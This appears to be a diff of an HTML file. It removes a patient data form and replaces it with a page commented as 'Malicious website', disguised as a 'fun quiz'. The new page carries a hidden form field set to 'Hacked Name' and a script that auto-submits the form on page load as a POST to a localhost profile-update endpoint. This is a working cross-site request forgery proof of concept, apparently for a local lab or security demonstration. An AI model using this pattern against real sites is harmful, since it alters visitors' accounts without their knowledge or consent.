@@ -1,50 +1,17 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Textbox Handler</title>
-</head>
+<!-- Malicious website -->
+<html>
 
 <body>
-
-    <!-- Patient Data Form -->
-    <h2>Patient Data Form</h2>
-    <form action="submit_data.php" method="post">
-        <!-- Patient Name -->
-        <label for="patientName">Patient Name:</label>
-        <input type="text" id="patientName" name="patientName" required>
-        <br><br>
-
-        <!-- Patient Age -->
-        <label for="patientAge">Age:</label>
-        <input type="number" id="patientAge" name="patientAge" min="0" required>
-        <br><br>
-
-        <!-- Patient Gender -->
-        <label for="patientGender">Gender:</label>
-        <select id="patientGender" name="patientGender">
-            <option value="male">Male</option>
-            <option value="female">Female</option>
-            <option value="other">Other</option>
-        </select>
-        <br><br>
-
-        <!-- Patient Address -->
-        <label for="patientAddress">Address:</label>
-        <textarea id="patientAddress" name="patientAddress" rows="4" cols="50" required></textarea>
-        <br><br>
-
-        <!-- Submit Button -->
-        <input type="submit" value="Submit">
+    <h1>Welcome to our fun quiz!</h1>
+    <form action="http://localhost:3003/updateProfile" method="POST">
+        <input type="hidden" name="name" value="Hacked Name" />
+        <input type="submit" value="Start Quiz!" />
     </form>
-
-    <!-- Existing Text Input -->
-    <input type="text" id="textInput" placeholder="Type here...">
-
-    <!-- Injected Scripts -->
-    <script src="formoverride.js"></script>
+    <script>
+        window.onload = function () {
+            document.forms[0].submit();
+        }
+    </script>
 </body>
 
 </html>
